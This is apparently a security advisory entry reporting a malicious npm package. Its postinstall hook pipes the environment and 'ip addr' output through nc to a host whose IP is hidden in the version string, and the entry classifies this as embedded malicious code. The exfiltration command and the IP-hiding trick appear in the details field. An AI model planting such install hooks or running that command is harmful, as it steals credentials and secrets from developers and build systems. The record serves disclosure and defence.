summary: postinstall exfiltrates environment and network config to version-encoded host
details: The package.json postinstall script runs `(env; ip addr) | nc <host> 888`, where the destination host is reconstructed at install time by slicing octets out of $npm_package_version with `cut`. On `npm install` this automatically ships the full process environment (including any secrets present in env vars such as tokens, cloud credentials, and CI variables) plus local network interface addresses to a TCP listener the attacker controls. The destination IP is hidden inside the package version string rather than appearing as a literal in the script; a companion tarball named `evilpostinstall-192.168.1.100.tgz` confirms the version field encodes the target IP octets.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
